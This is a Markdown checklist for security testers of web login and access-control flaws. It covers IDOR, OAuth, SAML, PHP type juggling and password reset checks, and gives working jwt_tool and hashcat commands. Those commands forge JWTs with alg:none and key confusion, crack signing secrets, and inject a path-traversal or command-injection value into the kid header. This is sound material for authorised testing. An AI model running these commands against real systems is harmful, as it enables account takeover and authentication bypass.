# Web authentication and access control

GraphQL: [graphql.md](graphql.md). Deserialization parser clues: [insecure-deserialization.md](insecure-deserialization.md)

| Check | Do | Real finding only if |
| --- | --- | --- |
| IDOR | 2 accounts: swap only the object ID; compare read + write + stored result; repeat unauthenticated | Cross-user/privilege boundary crossed (`200` alone isn't proof) |
| Mass assignment | Add `role` / `ownerId` to a normal update | Server persisted it |
| OAuth/OIDC | Record `redirect_uri`, `state`, `nonce`; change `redirect_uri`; replay callback in another session | Missing/mismatched state accepted, or code/token reaches your host |
| SAML | Check signature, issuer, destination, audience, timestamps, `InResponseTo`; test `RelayState` allowlist | A second account/SP endpoint accepts it |
| PHP type juggling | Compare with `==`: a magic hash (`0e<digits>` on both sides) or `password[]=x` / `{"password":["x"]}` against `strcmp()` | Server uses `==`/`strcmp()`, not `===`/`hash_equals()`. PHP 8+ array input throws a `TypeError` instead of bypassing — an error here is not a bypass |
| Password reset logic | Diff two reset tokens requested back to back; replay an old/expired one; swap the target identifier (email/user-id) after requesting your own reset | Token predictable/reusable, or the reset lands on an account other than the one that requested it |

## JWT
Decode header/payload; test `alg:none`, weak HMAC secret, public-key/HMAC confusion.

```bash
jwt_tool.py <JWT>                                            # decode
jwt_tool.py <JWT> -X a                                       # alg:none
jwt_tool.py <JWT> -X k -pk pub.pem                            # key confusion: RS256 → HS256, public key as the HMAC secret
jwt_tool.py <JWT> -C -d /usr/share/wordlists/rockyou.txt      # crack the HMAC secret
jwt_tool.py <JWT> -T -S hs256 -p '<SECRET>'                   # tamper a claim interactively, then re-sign
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
```
- `hashcat -m 16500` and `jwt_tool -C -d <wordlist>` crack the same thing; `jwt_tool` also re-signs with the found secret in one step.

### `kid` header injection
If `kid` names a file path the server reads as the verification key, point it at something with known (or empty) content and sign to match:
```bash
jwt_tool.py -t 'http://<IP>/<PATH>' -rc '<NAME>=<JWT>' -M pb
jwt_tool.py <JWT> -I -hc kid -hv '../../../../../../../dev/null' -S hs256 -p ''
```
- `-M pb` (playbook) runs this automatically — null-signed `kid=/dev/null` and path-traversal variants, plus a `kid` command-injection probe (`|sleep 10`) — alongside every other built-in check. Scan modes send real requests: `-t` = a page that checks the token, `-rc` = cookie carrying it (header token: `-rh 'Authorization: Bearer <JWT>'`). The `-I`/`-hc`/`-hv` form targets just this one.
